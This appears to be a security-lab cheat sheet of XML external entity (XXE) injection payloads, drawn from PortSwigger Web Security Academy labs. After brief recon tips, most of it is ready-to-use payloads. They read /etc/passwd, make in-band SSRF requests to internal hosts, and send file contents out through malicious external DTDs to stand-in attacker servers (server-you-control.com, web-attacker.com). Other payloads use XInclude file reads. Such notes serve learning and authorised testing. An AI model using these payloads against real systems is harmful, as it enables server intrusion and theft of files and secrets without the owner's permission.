# XXE Injection

## Summary

* [Recon for XXE](#recon)

* [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)

## Recon

### How to find and test for XXE vulnerabilities

* https://www.bugcrowd.com/blog/how-to-find-xxe-bugs/ 


* Manually testing for XXE vulnerabilities generally involves:

    * Testing for file retrieval by defining an external entity based on a well-known operating system file and using that entity in data that is returned in the application's response.


    * Testing for blind XXE vulnerabilities by defining an external entity based on a URL to a system that you control, and monitoring for interactions with that system. Burp Collaborator client is perfect for this purpose.


    * Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document by using an XInclude attack to try to retrieve a well-known operating system file.


    * If the application is allowing to upload files with a svg, xml, xlsx extension or any other file formats that either use or contain XML subcomponents, try injecting an appropriate XXE payload. 


    * Modify the content type of the requests to XML type and see if the application still processes the modified data correctly.  If it does try injecting a XXE payload.


* https://portswigger.net/web-security/xxe#how-to-find-and-test-for-xxe-vulnerabilities

---

## Cheat Sheet


**If the application <u>is returning</u> the values of the defined external entities in its response, we can try the following techniques:**


### File Retrieval

* Inject the following payload in the body of the request on the target application:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

* Then use the defined xxe entity in an xml value in the request:

```xml
&xxe;
```

* We may be able to see the contents of the /etc/passwd file in the response.


### In-band SSRF

* Inject the following payload in the body of the request on the target application:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

* Then use the defined xxe entity in an xml value in the request:

```xml
&xxe;
```

* We may be able to see the HTTP response returned from the internal website.


<br><br>

### Example:  XXE Injection Attack

* The XML value in \<productId\> is being reflected in the response when an error is triggered so this was a good target for in-band XXE injection.

* The below is an example payload for XXE injection:



![XXE Injection](https://github.com/ChrisM-X/Payloads_Cheat-Sheets/blob/main/Web%20Security%20Payloads/Portswigger%20-%20Web%20Security%20Academy/XXE%20Injection/Images/XXE-1.png)



<br><br><br>

**If the application <u>is not returning</u> the values of the defined external entities in its response, we need to use Blind Payload Techniques:**



### Blind XXE to a server you control

* Inject the following payload in the body of the request on the target application:


```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://server-you-control.com"> ]>
```

* Then use the defined xxe entity in an xml value in the request:

```xml
&xxe;
```

* Check your server logs for any network traffic.



### Blind XXE to a server you control, when regular external entities are blocked (use parameter entities):

* Inject the following payload in the body of the request on the target application:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://server-you-control.com"> %xxe; ]>
```

* Here the xxe parameter entity needs to be referenced “within” the DOCTYPE.

* Check your server logs for any network traffic.


<br><br>
### Example:  XXE Injection Parameter Entities

![XXE Injection2](https://github.com/ChrisM-X/Payloads_Cheat-Sheets/blob/main/Web%20Security%20Payloads/Portswigger%20-%20Web%20Security%20Academy/XXE%20Injection/Images/XXE-2.png)


<br><br>

### Blind XXE to exfiltrate data – malicious external DTD

* Host the following code in a .dtd file on your server:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://server-you-control.com/?x=%file;'>">
%eval;
%exfiltrate;
```

* Now inject the following payload in the body of the request on the target application:  

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://server-you-control.com/malicious.dtd"> %xxe;]>
```


### Blind XXE to exfiltrate data – external DTD via error messages

* Host the following code in a .dtd file on your server, the “nonexistent” file will cause an error message, and the response’s stack trace will contain the file’s contents:


```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

* Inject the following payload in the body of the request on the target application:  

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```



### Blind XXE – repurpose a local DTD

* https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-by-repurposing-a-local-dtd



### Hidden Attack Surface – XInclude Attacks

* Inject the following payload in the body of the request on the target application: 

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```


### Hidden Attack Surface – File Upload

* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#xxe-in-exotic-files


### Change Content Type of Request

* Change the content type and body of the request to XML type and analyze if the application still processes the request correctly.  If it does, then we can try XXE payloads.

    * Example:  foo=bar

```xml
<?xml version="1.0" encoding="UTF-8"?>
<foo>bar</foo>
```
